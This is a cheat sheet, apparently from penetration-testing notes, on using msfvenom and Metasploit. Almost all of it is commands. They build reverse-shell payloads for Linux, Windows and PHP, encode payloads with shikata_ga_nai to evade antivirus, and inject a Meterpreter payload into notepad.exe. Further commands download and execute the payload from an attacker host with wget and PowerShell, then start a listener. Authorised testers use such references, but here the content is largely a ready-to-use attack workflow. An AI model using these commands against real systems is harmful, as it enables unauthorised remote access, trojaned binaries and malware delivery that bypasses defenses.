# MSFVenom

!!! tip ""
    For Windows targets with AV, use a staged payload (`windows/x64/meterpreter/reverse_tcp`) over stageless (`windows/x64/meterpreter_reverse_tcp`) — staged payloads are smaller and easier to obfuscate. Pair with `shikata_ga_nai` or a custom XOR encoder.

!!! warning "Watch out"
    Output format matters: `-f exe` for Windows, `-f elf` for Linux, `-f raw` for shellcode injection. Wrong format = silent failure on execution.

---

## List Payloads

```bash
msfvenom --list payloads | grep windows
msfvenom --list payloads | grep linux
```

---

## Generate Payloads

### Linux Reverse Shell (ELF)

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f elf > shell.elf
```

### Windows Reverse Shell (EXE)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell.exe
```

### PHP Reverse Shell

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f raw > shell.php
```

### Windows Shellcode (for injection)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f c
```

---

## Encode to Evade AV

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<port> \
  -f exe -e x86/shikata_ga_nai -i 5 > encoded_shell.exe

msfvenom --list encoders
```

---

## Inject Into a Legitimate Binary

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -x notepad.exe -k \
  -f exe -o infected.exe LHOST=<attacker-ip> LPORT=<port>
```

---

## Deliver and Execute

```bash
# Serve the payload
python3 -m http.server 80

# On Linux target
wget http://<attacker-ip>/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# On Windows target (PowerShell)
iwr -uri http://<attacker-ip>/shell.exe -OutFile C:\Temp\shell.exe; C:\Temp\shell.exe
```

---

## Set Up the Listener

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <attacker-ip>; set LPORT <port>; exploit"
```
